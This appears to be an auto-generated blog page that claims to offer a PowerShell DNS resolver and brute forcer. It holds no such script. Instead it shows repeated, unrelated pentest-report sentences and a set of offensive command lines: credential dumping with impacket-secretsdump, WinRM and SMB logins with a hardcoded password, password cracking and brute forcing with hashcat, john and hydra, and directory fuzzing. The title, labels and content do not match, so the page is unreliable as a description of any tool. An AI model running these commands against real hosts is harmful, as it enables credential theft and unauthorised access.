---
TitleSEO: "DNS Resolver and Brute Forcer in PowerShell | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "fuzzer, powershell, rust"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-312.html"
URL_IMAGES: ""
Date: "2024-09-28"
Tags: "Fuzzer, PowerShell, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-312"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-312.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `msfvenom`
- `sharphound`
- `metasploit`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
evil-winrm -i 10.20.41.216 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p464,21,443 10.65.87.242 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.181.201
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.247.9 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.177.206
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
gobuster dir -u http://10.70.182.30/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.70.191.37 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.115.176
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.74.161/FUZZ
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 23.71s
```
